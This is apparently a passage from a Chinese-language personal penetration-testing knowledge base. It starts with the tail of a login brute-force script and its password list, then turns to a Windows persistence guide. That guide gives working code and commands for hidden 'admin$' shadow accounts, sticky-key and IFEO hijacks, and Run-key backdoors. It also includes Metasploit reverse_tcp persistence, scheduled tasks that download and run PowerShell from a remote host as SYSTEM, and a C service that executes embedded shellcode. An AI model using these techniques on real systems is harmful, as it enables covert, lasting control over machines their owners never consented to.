rm','chinanet','erp','hello','hr','iem','king','MEDIA','microsoft','mnbvcxz','mysql','mysteelsoft','plm','q1w2e3r4','qwertyuiop','r4e3w2q1','sa!@#','sa!@#$%^','sa123456','sapass','saas','sasasa','sql2008','sqlpass','sqlpassword','sqladmin','sys','system','sunny','tianya','zxcvbnm','ems','crm2006','crm2007','crm2008','crm2009','crm2010','hrsvr','sa20060876','golf','123456Aa','123456Ab','123456Ac','test123','WebLogic','free','user1','user12','user123','user1234','user12345','user123456','#NAME?','liuwei123','admin2006','neteye','Test123456','admin*123','ucenter','aa123456','h3capadmin','1234567890','boston','guest','phpmyadmin','fuckyou','7007','jyadmin','020php168','seeyon','111111111','nozuonodie','1\\'or\\'1\\'=\\'1','world','helloworld','manageradmin111111','manageradmin','adminmanager111111','adminmanager','123456qq','qazwsxedc','huangxiaoqin','123456a','huawei','ncportal','111000','1314520','\\'or\\'=\\'or\\'','default','enable','discuz','laixianjian','unvs123','wordpress','leolee','localhost','10000','neworiental','youyuan','zuods123','123***','tomcat','dba','zted888888','xunlei','110','120','114','119','apache','xcmcn123456','adminInfo','skyclass','XXOO','xuezhenhe','10086','10010','guanliyuan','yunwei','cctv6','cctv5','cctv4','cctv3','cctv2','cctv1','12306','12306caonima','ete123','server123','null','admin111','caonima','nimabi','mlgb','conadmin','1qaz!QAZ','TRUE','FALSE'); for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } 效果： Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-15 12:49:45 "},"个人知识库/01.渗透测试/04.权限维持/":{"url":"个人知识库/01.渗透测试/04.权限维持/","title":"04.权限维持","keywords":"","body":"前言 未知攻焉知防，攻击者在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者如入无人之境。这里整理一些window服务端常见的后门技术，了解攻击者的常见后门技术，有助于更好去发现服务器安全问题。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 18:27:08 "},"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.html":{"url":"个人知识库/01.渗透测试/04.权限维持/01.Windows权限维持.html","title":"01.Windows权限维持","keywords":"","body":" Windows权限维持 影子账号 1、 对注册表赋予权限 2、创建特殊账户 3、导出注册表 4、删除特殊账户 5、导入reg文件 6、大功告成 7、删除方法 8、脚本自动化 辅助功能镜像劫持 低版本 高版本 什么是IFEO 可视化修改 命令行修改 开机启动项 开始菜单启动项 组策略 启动项注册表后门 命令行 Metasploit SharPersist PoshC2 Empire 计划任务 服务 创建服务 CMD直接创建服务 Powershell创建服务 其他 其他的一些工具 SharPersist PowerSploit PoshC2 Metasploit telnet服务 快捷方式 什么是LNK 利用手法 利用过程 直接修改，放置启动目录 同时启动两个程序 一些辅助工具 Empire SharPersist PoshC2 DLL劫持 介绍 时间服务器 补充说明 Print Spooler端口监视器 Netsh Helper DLL COM劫持 介绍 持久化 计划任务 参考文章 Winlogon用户登录初始化 Logon Scripts后门 文件关联（打开方式） Bitsadmin 进程注入 屏幕保护程序 WMI构造无文件后门 安全支持提供者 Mimikatz 方法一 方法二 PowerSploit Empire SharpSploitConsole 参考链接 Windows权限维持 影子账号 影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。 1、 对注册表赋予权限 默认注册表 HKEY_LOCAL_MACHINE\\SAM\\SAM\\ 只有system权限才能修改 现在需要为其添加管理员权限 右键-权限-选中Administrators，允许完全控制 重启注册表 2、创建特殊账户 net user admin$ Aa123456... /add net localgroup administrators admin$ /add PS: 用 $ 结尾是因为 net user 无法获取，一定情况下隐蔽 3、导出注册表 在注册表 HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names下找到新建的帐户 admin$ 还有如图的 2 个，均导出 得到3个导出的注册表，如下 编辑 1F4 和 3EE 的注册表，用 1F4 里面的 F 去替换 3EE 里面的 F 保存 4、删除特殊账户 net user admin$ /del 5、导入reg文件 方法一：直接双击 admin$ 和 3EE 注册表 方法二： regedit /s 3EE.reg regedit /s admin$.reg 6、大功告成 无法通过 net user admin$ /del 来删除 7、删除方法 删除注册表 HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\ 下对应帐户的键值即可(共有两处) 8、脚本自动化 https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1 PS C:>.\\Windows-User-Clone_ps1.ps1 powershell -File Windows-User-Clone_ps1.ps1 function Create-Clone { Param( [Parameter(Mandatory=$true)] [String] $u, [Parameter(Mandatory=$true)] [String] $p, [Parameter(Mandatory=$false)] [String] $cu = \"administrator\" ) function Create-user ([string]$Username,[string]$Password) { $group = \"Administrators\" $adsi = [ADSI]\"WinNT://$env:COMPUTERNAME\" $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username } if ($existing -eq $null) { Write-Host \"Creating new local user $Username with password $Password\" & NET USER $Username $Password /add /y /expires:never | Out-Null Write-Host \"Adding local user $Username to $group.\" & NET LOCALGROUP $group $Username /add | Out-Null } else { Write-Host \"[*] Setting password for existing local user $Username\" $existing.SetPassword($Password) } Write-Host \"[*] Ensuring password for $Username never expires\" WMIC USERACCOUNT WHERE \"Name='$Username'\" SET PasswordExpires=FALSE } function GetUser-Key([string]$user) { cmd /c \"regedit /e $env:temp\\$user.reg \"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$user\"\" $file = Get-Content \"$env:temp\\$user.reg\" | Out-String $pattern=\"@=hex\\((.*?)\\)\\:\" $file -match $pattern |Out-Null $key = \"00000\"+$matches[1] Write-Host $key return $key } function Clone ([string]$ukey,[string]$cukey) { $ureg = \"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$ukey\" |Out-String $cureg = \"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$cukey\" |Out-String $cuFreg = Get-Item -Path $cureg.Trim() $cuFvalue = $cuFreg.GetValue('F') Set-ItemProperty -path $ureg.Trim() -Name \"F\" -value $cuFvalue $outreg = \"HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\$ukey\" cmd /c \"regedit /e $env:temp\\out.reg $outreg.Trim()\" Write-Host \"Copy from $cu to $u success.\" } function Main () { Write-Host \"[*] Current token: \" -NoNewline $token=whoami if($token -ne \"nt authority\\system\") { Write-Host \" \" $token Write-Host \"[!] Low privileges.\" Write-Host \"[*] Exit.\" Exit } else { Write-Host $token } Write-Host \"[*] Create User...\" Create-user $u $p Write-Host \"[*] Get User $u's Key: \" -NoNewline $ukey = GetUser-Key $u |Out-String Write-Host \"[*] Get User $cu's Key: \" -NoNewline $cukey = GetUser-Key $cu |Out-String Write-Host \"[*] Try to clone...\" Clone $ukey $cukey Write-Host \"[*] Delete User:$u\" Net User $u /del |Out-Null Write-Host \"[*] Import the registry\" cmd /c \"regedit /s $env:temp\\$u.reg\" cmd /c \"regedit /s $env:temp\\out.reg\" Write-Host \"[*] Clearn\" Remove-Item $env:temp\\*.reg Write-Output \"[*] All Done.\" } Main } Create-Clone -u admin$ -p Aa123456... 辅助功能镜像劫持 为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。 比如最常见的按5下shift出现的粘滞键Sethc.exe（shift后门），还有Windows + U组合键时启动的utilman.exe程序 屏幕键盘：C:\\Windows\\System32\\osk.exe 放大镜：C:\\Windows\\System32\\Magnify.exe 旁白：C:\\Windows\\System32\\Narrator.exe 显示切换器 C:\\Windows\\System32\\DisplaySwitch.exe 应用切换器：C:\\Windows\\System32\\AtBroker.exe 低版本 在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\\Windows\\System32\\sethc.exe替换为cmd.exe。 cd WINDOWS\\system32 move sethc.exe sethc.exe.bak copy cmd.exe sethc.exe 直接按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。 高版本 再较高的版本中，我们需要用到IFEO,即映像劫持。 什么是IFEO 所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。 当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序 可视化修改 在iexplorer.exe中加入键值对:debugger c:\\windows\\system32\\cmd.exe 命令行修改 reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\" /v \"Debugger\" /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\" /f 需要管理员权限 开机启动项 开始菜单启动项 开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项： [WIN+R 输入] shell:startup C:\\Users\\SD\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 相关键值 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders 由于每台电脑的快速启动目录不同,可以代码实现 #include #include #include #pragma comment(lib, \"shell32.lib\") BOOL AutoRun_Startup(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName) { BOOL ret = false; CHAR szStartPath[MAX_PATH] = { 0 }; CHAR szDestFilePath[MAX_PATH] = { 0 }; //返回快速启动目录路径到szStartPath ret = ::SHGetSpecialFolderPathA(NULL, szStartPath,CSIDL_STARTUP,TRUE); //判断是否获取成功 if (ret == TRUE) { printf(\"[+]Get the quick start directory successfully！\\n\"); } else { printf(\"[!]Get the quick start directory faild！\\n\"); return FALSE; } //构造文件在快速启动目录下的路径 ::wsprintfA(szDestFilePath,\"%s\\\\%s\",szStartPath,lpszDestFileName); //复制文件到快速启动目录下 ret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE); if (FALSE == ret) { printf(\"[!]Failed to save the file in the quick start directory.\\n\"); return FALSE; } else { printf(\"[!]Successfully to save the file in the quick start directory.\\n\"); } printf(\"[+]Backdoor generation in quick start directory successful!\\n\"); return TRUE; } int main(int argc, char* argv[]) { printf(\"[*]Useage:\\n %s %s %s\\n\", \"Run_StartUp.exe\", \"E:\\\\010Editor\\\\010 Editor\\\\010Editor.exe\", \"010Editor.exe\"); if (argc == 3) { AutoRun_Startup(argv[1], argv[2]); } else { printf(\"[!]Please check the number of your parameters\\n\"); } } 组策略 组策略，运行gpedit.msc，通过组策略的“脚本(启动/关机)”项来说实现。 具体位置在“计算机配置→Windows设置”项下。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。 启动项注册表后门 命令行 注册表项可以从终端添加到运行键以实现持久性。这些键将包含对用户登录时将执行的实际负载的引用，已知使用此持久性方法的威胁因素和红队使用以下注册表位置。 reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Pentestlab /t REG_SZ /d \"C:\\Users\\pentestlab\\pentestlab.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Pentestlab /t REG_SZ /d \"C:\\Users\\pentestlab\\pentestlab.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Pentestlab /t REG_SZ /d \"C:\\Users\\pentestlab\\pentestlab.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Pentestlab /t REG_SZ /d \"C:\\Users\\pentestlab\\pentestlab.exe\" 值得注意的是，HKEY_CURRENT_USER的改动不需要管理员权限，而更改HKEY_LOCAL_MACHINE却是需要管理员权限 如果已获得提升的凭据，则最好使用本地计算机注册表位置，而不是当前用户，因为payload将在每次系统启动时执行，而与使用系统身份验证的用户无关。 reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\" 另外两个注册表位置，这些位置可以允许红队通过执行任意payload或DLL来实现持久性。这些将在登录期间执行，并且需要管理员级别的特权。 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.exe\" reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend\" /v Pentestlab /t REG_SZ /d \"C:\\tmp\\pentestlab.dll\" Metasploit Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个payload，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该payload。 run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r 10.0.2.21 另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。 use post/windows/manage/persistence_exe set REXEPATH /tmp/pentestlab.exe set SESSION 2 set STARTUP USER set LOCALEXEPATH C:\\\\tmp run 由于已选择USER作为选项，该模块将使用当前用户的注册表位置。 如果已获得系统级别的特权，则可以将该模块配置为在HKLM位置中创建注册表项。该STARTUP选项将需要改变系统。 set STARTUP SYSTEM SharPersist SharPersist是Brett Hawkins在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行键。该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。以下命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意payload。 SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c C:\\tmp\\pentestlab.exe\" -k \"hkcurun\" -v \"pentestlab\" -m add 如果已获得提升的访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久性。 SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c C:\\tmp\\pentestlab.exe\" -k \"hklmrun\" -v \"pentestlab\" -m add -o env SharPersist还通过RunOnce和RunOnceEx注册表项包含持久性功能。以下命令将在这些位置创建注册表项，这些注册表项将执行任意payload。 SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c pentestlab.exe\" -k \"hklmrunonce\" -v \"Pentestlab\" -m add SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c pentestlab.exe\" -k \"hklmrunonceex\" -v \"Pentestlab\" -m add SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c pentestlab.exe\" -k \"hkcurunonce\" -v \"Pentestlab\" -m add SharPersist还提供了使用另一个注册表位置进行持久化的选项（UserInitMprLogonScript）。 SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c pentestlab.exe\" -k \"logonscript\" -m add PoshC2 PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表项。 install-persistence 注册表的“运行”项将具有IEUpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册表中。 Empire 如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据特权级别，这些模块将尝试在以下注册表位置中安装base64payload： HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug usemodule persistence/userland/registry usemodule persistence/elevated/registry* 将在名称Updater下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下次登录时运行Debug密钥中存储的payload，以实现持久性。 HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 计划任务 Windows操作系统提供了一个实用程序（schtasks.exe），使系统管理员能够在特定的日期和时间执行程序或脚本。这种行为可作为一种持久性机制被red team利用。通过计划任务执行持久性不需要管理员权限，但如果已获得提升的权限，则允许进一步操作，例如在用户登录期间或在空闲状态期间执行任务。 计划任务的持久化技术可以手动实现，也可以自动实现。payload可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。这被认为是一种旧的持久性技术，但是它仍然可以在red team场景中使用，并且由各种开源工具支持。 图形化位置：开始--所有程序--附件--系统工具--任务计划程序 Windows命令行实现定时任务主要有schtasks与at二种方式: at 适用于windows xp/2003，schtasks适用于win7/2008或者以后 每五分钟执行一次 schtasks /create /sc minute /mo 5 /tn \"sd\" /tr C:\\Windows\\System32\\cmd.exe 该任务将在每个Windows登录中以SYSTEM的形式下载并执行基于PowerShell的payload。 schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System 一些举例 #(X64) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X64) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 #(X86) - On User Login schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System #(X86) - On System Start schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System #(X86) - On User Idle (30mins) schtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30 服务 在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。 创建服务 CMD直接创建服务 sc create \"SD\" binpath= \"C:\\Users\\SD\\Desktop\\test.exe\" sc description \"SD\" \"description\" # 设置服务的描述字符串 sc config \"SD\" start= auto # 设置这个服务为自动启动 net start \"SD\" # 启动服务 sc create pentestlab binpath= \"cmd.exe /k C:\\temp\\pentestlab.exe\" start=\"auto\" obj=\"LocalSystem\" sc start pentestlab Powershell创建服务 New-Service -Name \"pentestlab\" -BinaryPathName \"C:\\temp\\pentestlab.exe\" -Description \"PentestLaboratories\" -StartupType Automatic sc start pentestlab 其他 也可以直接编写一个服务,穿插着shellcode上线 #include #include unsigned char buf[] =\"\\xfc\\xe8\\x89\\x00\\x00...............................................\\x36\\x38\\x2e\\x31\\x2e\\x31\\x30\\x36\\x00\\x12\\x34\\x56\\x78\"; #define SLEEP_TIME 5000 /*间隔时间*/ #define LOGFILE \"C:\\\\Windows\\\\log1.txt\" /*信息输出文件*/ SERVICE_STATUS ServiceStatus; /*服务状态*/ SERVICE_STATUS_HANDLE hStatus; /*服务状态句柄*/ void ServiceMain(int argc, char** argv); void CtrlHandler(DWORD request); int InitService(); int main(int argc, CHAR* argv[]) { WCHAR WserviceName[] = TEXT(\"sddd\"); SERVICE_TABLE_ENTRY ServiceTable[2]; ServiceTable[0].lpServiceName = WserviceName; ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain; ServiceTable[1].lpServiceName = NULL; ServiceTable[1].lpServiceProc = NULL; StartServiceCtrlDispatcher(ServiceTable); return 0; } int WriteToLog(const char* str) { FILE* pfile; fopen_s(&pfile, LOGFILE, \"a+\"); if (pfile == NULL) { return -1; } fprintf_s(pfile, \"%s\\n\", str); fclose(pfile); return 0; } /*Service initialization*/ int InitService() { CHAR Message[] = \"Monitoring started.\"; OutputDebugString(TEXT(\"Monitoring started.\")); int result; result = WriteToLog(Message); return(result); } /*Control Handler*/ void CtrlHandler(DWORD request) { switch (request) { case SERVICE_CONTROL_STOP: WriteToLog(\"Monitoring stopped.\"); ServiceStatus.dwWin32ExitCode = 0; ServiceStatus.dwCurrentState = SERVICE_STOPPED; SetServiceStatus(hStatus, &ServiceStatus); return; case SERVICE_CONTROL_SHUTDOWN: WriteToLog(\"Monitoring stopped.\"); ServiceStatus.dwWin32ExitCode = 0; ServiceStatus.dwCurrentState = SERVICE_STOPPED; SetServiceStatus(hStatus, &ServiceStatus); return; default: break; } /* Report current status */ SetServiceStatus(hStatus, &ServiceStatus); return; } void ServiceMain(int argc, char** argv) { WCHAR WserviceName[] = TEXT(\"sddd\"); int error; ServiceStatus.dwServiceType = SERVICE_WIN32; ServiceStatus.dwCurrentState = SERVICE_START_PENDING; /*在本例中只接受系统关机和停止服务两种控制命令*/ ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_STOP; ServiceStatus.dwWin32ExitCode = 0; ServiceStatus.dwServiceSpecificExitCode = 0; ServiceStatus.dwCheckPoint = 0; ServiceStatus.dwWaitHint = 0; hStatus = ::RegisterServiceCtrlHandler( WserviceName, (LPHANDLER_FUNCTION)CtrlHandler); if (hStatus == (SERVICE_STATUS_HANDLE)0) { WriteToLog(\"RegisterServiceCtrlHandler failed\"); return; } WriteToLog(\"RegisterServiceCtrlHandler success\"); /* Initialize Service */ error = InitService(); if (error) { /* Initialization failed */ ServiceStatus.dwCurrentState = SERVICE_STOPPED; ServiceStatus.dwWin32ExitCode = -1; SetServiceStatus(hStatus, &ServiceStatus); return; } LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, buf, sizeof(buf)); ((void(*)())Memory)(); /*向SCM 报告运行状态*/ ServiceStatus.dwCurrentState = SERVICE_RUNNING; SetServiceStatus(hStatus, &ServiceStatus); /*do something you want to do in this while loop*/ MEMORYSTATUS memstatus; while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) { char buffer[16]; GlobalMemoryStatus(&memstatus); int availmb = memstatus.dwAvailPhys / 1024 / 1024; sprintf_s(buffer, 100, \"available memory is %dMB\", availmb); int result = WriteToLog(buffer); if (result) { ServiceStatus.dwCurrentState = SERVICE_STOPPED; ServiceStatus.dwWin32ExitCode = -1; SetServiceStatus(hStatus, &ServiceStatus); return; } Sleep(SLEEP_TIME); } WriteToLog(\"service stopped\"); return; } 这其实也是psexec的原理:建立连接后创建服务反弹shell 删除服务: sc delete \"SD\" 其他的一些工具 SharPersist https://github.com/fireeye/SharPersist SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c pentestlab.exe\" -n \"pentestlab\" -m add PowerSploit https://github.com/PowerShellMafia/PowerSploit Set-ServiceBinPath -Name pentestlab -binPath \"cmd.exe /k C:\\temp\\pentestlab.exe\" Write-ServiceBinary -Name pentestlab -Command \"cmd.exe /k C:\\temp\\pentestlab.exe\" PoshC2 https://github.com/nettitude/PoshC2_Python install-servicelevel-persistence Metasploit use post/windows/manage/persistence_exe set REXEPATH /tmp/pentestlab.exe set SESSION 1 set STARTUP SERVICE set LOCALEXEPATH C:\\\\tmp run telnet服务 telnet是命令行下的远程登录工具，不过在服务器管理时使用不多也常为管理员所忽视。攻击者如果在控制一台服务器后，开启“远程桌面”进行远程控制非常容易被管理员察觉，但是启动Telnet进行远程控制却不容易被察觉。不过，telnet的默认端口是23，如果开启后，别人是很容易扫描到的，因此攻击者会更改telnet的端口，从而独享该服务器的控制权。 快捷方式 什么是LNK lnk文件是用于指向其他文件的一种文件。 这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。 利用手法 为恶意进程创建快捷方式，并将其加入启动程序。 利用当前用户现有的快捷方式进行迷惑，达到既能开启原程序，又能执行恶意程序的效果。 利用过程 直接修改，放置启动目录 右键快捷方式 --> 属性 --> 目标 通过更改图标来增加迷惑性 最后放到启动目录即可 同时启动两个程序 自启动容易被发现，所以用户在打开正常应用的时候允许同时打开2个应用（包含正常应用）稍微隐蔽一点。 这里需要用到powershell进行辅助 修改目标值为： powershell.exe -c \"invoke-item 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'; invoke-item c:\\windows\\system32\\calc.exe\" 此时点击快捷方式就可以同时启动两个应用了，缺点就是启动的时候会有一个CMD黑框 解决方案：属性中的运行方式选择最小化 此方案不足的点，就是鼠标指向图标时，会显示powershell路径 一些辅助工具 Empire Empire包含一个持久性模块，该模块可以后门合法的快捷方式（.LNK），以执行任意的PowerShellpayload。现有快捷方式的目标字段将被修改以执行存储在注册表项中的base64脚本。 usemodule persistence/userland/backdoor_lnk 查看快捷方式的属性将显示目标字段已成功修改以执行PowerShellpayload。 由于快捷方式存在于启动文件夹中，因此暂存器将在下一次Windows登录中执行，并且将与命令和控制服务器建立连接。 但是，Empire包含一个可用于生成具有LNK文件格式的暂存器的模块。 usestager windows/launcher_lnk set Listener http execute 默认情况下，此模块将使用写字板图标伪装成可信任的应用程序。 快捷方式的目标字段将使用执行Base64payload的PowerShell命令填充。可以将快捷方式转移并移动到启动文件夹中以保持持久性。 SharPersist SharPersist能够创建Internet Explorer快捷方式，该快捷方式将执行任意payload并将其放置在启动文件夹中以实现持久性。 SharPersist.exe -t startupfolder -c \"cmd.exe\" -a \"/c C:\\temp\\pentestlab.exe\" -f \"pentestlab\" -m add 当用户进行身份验证时，将执行payload，并打开Meterpreter会话. PoshC2 PoshC2可以创建一个LNK文件并将其直接放置在Windows启动文件夹中以保持持久性。可以通过执行以下命令来调用此技术： install-persistence 3 在Windows登录期间，快捷方式将尝试在注册表项上执行值，该注册表项包含base64格式的stager。 DLL劫持 介绍 DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。 程序所在⽬录。 加载 DLL 时所在的当前⽬录。 系统⽬录即 SYSTEM32 ⽬录。 16位系统⽬录即 SYSTEM ⽬录。 Windows⽬录。 PATH环境变量中列出的⽬录 dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。 在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls 关于dll劫持的文章有很多,也需要去挖掘,这里推荐一篇文章入门 https://www.cnblogs.com/punished/p/14715771.html 时间服务器 Windows操作系统正在利用时间提供者体系结构，以便从网络中的其他网络设备或客户端获取准确的时间戳。时间提供者以DLL文件的形式实现，该文件位于System32文件夹中。Windows启动期间将启动服务W32Time并加载w32time.dll。DLL加载是一种已知的技术，通常使红队攻击者有机会执行任意代码。 由于关联的服务会在Windows启动期间自动启动，因此可以将其用作持久性机制。但是，此方法需要管理员级别的特权，因为指向时间提供者DLL文件的注册表项存储在HKEY_LOCAL_MACHINE中。根据系统是用作NTP服务器还是NTP客户端，使用以下两个注册表位置。 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer 